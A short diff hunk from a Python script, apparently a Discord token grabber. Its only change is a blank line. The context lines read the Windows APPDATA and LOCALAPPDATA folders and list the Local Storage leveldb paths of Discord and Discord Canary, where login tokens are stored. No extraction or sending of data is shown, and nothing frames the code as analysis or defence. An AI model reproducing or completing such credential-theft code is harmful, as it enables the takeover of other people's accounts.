@@ -8,6 +8,7 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
 
+
 paths = {
     'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
     'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
